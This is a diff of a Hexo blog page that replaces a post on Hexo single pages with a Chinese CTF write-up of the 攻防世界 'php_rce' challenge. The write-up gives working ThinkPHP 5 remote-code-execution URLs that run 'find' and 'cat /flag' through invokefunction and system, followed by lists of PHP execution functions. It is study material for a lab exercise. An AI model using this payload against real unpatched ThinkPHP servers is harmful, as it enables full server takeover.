@@ -15,19 +15,20 @@
 
 
 
-<meta name="description" content="先用hexo new page ceshi建立一个ceshi的单页 通过在文件头中加入layout:false跳过主题渲染">
-<meta name="keywords" content="hexo,单页">
+<meta name="description" content="第一次见thinkPHP，以前只有听过  刚看到还以为我容器坏了…其实并没有 题目是phprce，我们先来介绍一下rce(远程代码执行漏洞)，百度结果如下： 11. 什么是远程代码执行漏洞2远程命令&amp;#x2F;代码执行漏洞，简称RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。RCE分为远程命令执行ping和远程代码执行evel。342. 漏洞产生的根本原因5">
+<meta name="keywords" content="web,攻防世界,ThinkPHP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="创建单页">
-<meta property="og:url" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;2020&#x2F;01&#x2F;02&#x2F;%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5&#x2F;index.html">
+<meta property="og:title" content="攻防世界-php_rce">
+<meta property="og:url" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;2020&#x2F;03&#x2F;09&#x2F;%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951&#x2F;index.html">
 <meta property="og:site_name" content="lingxin16">
-<meta property="og:description" content="先用hexo new page ceshi建立一个ceshi的单页 通过在文件头中加入layout:false跳过主题渲染">
+<meta property="og:description" content="第一次见thinkPHP，以前只有听过  刚看到还以为我容器坏了…其实并没有 题目是phprce，我们先来介绍一下rce(远程代码执行漏洞)，百度结果如下： 11. 什么是远程代码执行漏洞2远程命令&amp;#x2F;代码执行漏洞，简称RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。RCE分为远程命令执行ping和远程代码执行evel。342. 漏洞产生的根本原因5">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;2020&#x2F;01&#x2F;02&#x2F;%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5&#x2F;QQ%E6%88%AA%E5%9B%BE20200102180630.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;2020&#x2F;01&#x2F;02&#x2F;%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5&#x2F;%E6%86%A8%E6%86%A8%E8%84%B8%E7%BA%A2.jpg">
-<meta property="og:updated_time" content="2020-01-31T17:27:51.474Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;2020&#x2F;03&#x2F;09&#x2F;%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951&#x2F;QQ%E6%88%AA%E5%9B%BE20200309160713.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;2020&#x2F;03&#x2F;09&#x2F;%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951&#x2F;QQ%E6%88%AA%E5%9B%BE20200309162510.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;2020&#x2F;03&#x2F;09&#x2F;%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951&#x2F;QQ%E6%88%AA%E5%9B%BE20200309162435.jpg">
+<meta property="og:updated_time" content="2020-03-09T08:28:11.765Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;2020&#x2F;01&#x2F;02&#x2F;%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5&#x2F;QQ%E6%88%AA%E5%9B%BE20200102180630.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;lingxin16.github.io&#x2F;2020&#x2F;03&#x2F;09&#x2F;%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951&#x2F;QQ%E6%88%AA%E5%9B%BE20200309160713.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -59,7 +60,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>创建单页 | lingxin16</title>
+<title>攻防世界-php_rce | lingxin16</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -267,11 +268,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-创建单页" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-攻防世界刷题记录1" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/" class="article-date">
-      <time datetime="2020-01-02T10:03:53.000Z" itemprop="datePublished">2020-01-02</time>
+      <a href="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/" class="article-date">
+      <time datetime="2020-03-09T08:05:13.000Z" itemprop="datePublished">2020-03-09</time>
 </a>
 
 
@@ -286,7 +287,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      创建单页
+      攻防世界-php_rce
     </h1>
   
 
@@ -297,7 +298,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8D%95%E9%A1%B5/" rel="tag">单页</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ThinkPHP/" rel="tag">ThinkPHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -307,19 +308,27 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>先用<code>hexo new page ceshi</code>建立一个ceshi的单页</p>
-<p>通过在文件头中加入<code>layout:false</code>跳过主题渲染</p>
-<a id="more"></a>
+        <p>第一次见thinkPHP，以前只有听过</p>
+<p><img src="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/QQ%E6%88%AA%E5%9B%BE20200309160713.jpg" alt="QQ截图20200309160713"></p>
+<p>刚看到还以为我容器坏了…其实并没有</p>
+<p>题目是phprce，我们先来介绍一下rce(远程代码执行漏洞)，百度结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">1. 什么是远程代码执行漏洞</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">远程命令&#x2F;代码执行漏洞，简称RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。RCE分为远程命令执行ping和远程代码执行evel。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">2. 漏洞产生的根本原因</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">服务器没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。</span></pre></td></tr></table></figure>
 
-<p><img src="/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/QQ%E6%88%AA%E5%9B%BE20200102180630.png" alt="QQ截图20200102180630"></p>
-<p>然后将html代码插入到</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;</span></pre></td></tr></table></figure>
+<p>页面也说明了是ThinkPHP V5版本  百度得知这个版本的确有远程代码执行漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">ThinkPHP 5.0&lt;5.0.23&amp;5.1&lt;5.1.31版本在没有开启强制路由的情况下可能存在远程代码执行漏洞。攻击者通过该漏洞可能完全控制Web服务器。</span></pre></td></tr></table></figure>
 
-<p>和</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#123;% endraw %&#125;</span></pre></td></tr></table></figure>
+<p>直接上payload</p>
+<p>查找flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:43736&#x2F;index.php?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;find &#x2F; -name &quot;flag&quot;</span></pre></td></tr></table></figure>
 
-<p>中，就可以了。</p>
-<p><img src="/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/%E6%86%A8%E6%86%A8%E8%84%B8%E7%BA%A2.jpg" alt="憨憨脸红"></p>
+<p><img src="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/QQ%E6%88%AA%E5%9B%BE20200309162510.jpg" alt="QQ截图20200309162510"></p>
+<p>cat</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:43736&#x2F;index.php?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cat &#x2F;flag</span></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/QQ%E6%88%AA%E5%9B%BE20200309162435.jpg" alt="QQ截图20200309162435"></p>
+<p>附上一些查找到的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">PHP代码执行函数：eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  PHP命令执行函数：system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()</span></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -328,13 +337,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/">创建单页</a></p>
+        <p><span>本文标题:</span><a href="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/">攻防世界-php_rce</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">liu</a></p>
-        <p><span>发布时间:</span>2020-01-02, 18:03:53</p>
-        <p><span>最后更新:</span>2020-02-01, 01:27:51</p>
+        <p><span>发布时间:</span>2020-03-09, 16:05:13</p>
+        <p><span>最后更新:</span>2020-03-09, 16:28:11</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/" title="创建单页">http://lingxin16.github.io/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://lingxin16.github.io/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/　　作者: liu" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/" title="攻防世界-php_rce">http://lingxin16.github.io/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://lingxin16.github.io/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/　　作者: liu" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -347,15 +356,15 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2020/01/12/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
-                    强网杯-随便注
+                <a href="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/">
+                    攻防世界刷题记录1
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2020/01/01/%E7%AE%A1%E9%81%93%E7%AC%A6%E6%BC%8F%E6%B4%9E/">
-                    管道符漏洞
+                <a href="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/">
+                    ctfshow-萌新赛
                 </a>
             </div>
         
@@ -403,7 +412,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"创建单页　| lingxin16　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"攻防世界-php_rce　| lingxin16　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -423,7 +432,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2020/01/12/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" title="上一篇: 强网杯-随便注">
+            <a href="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/" title="上一篇: 攻防世界刷题记录1">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -431,7 +440,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2020/01/01/%E7%AE%A1%E9%81%93%E7%AC%A6%E6%BC%8F%E6%B4%9E/" title="下一篇: 管道符漏洞">
+            <a href="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/" title="下一篇: ctfshow-萌新赛">
                 <i class="fa fa-angle-right"></i>
             </a>
         
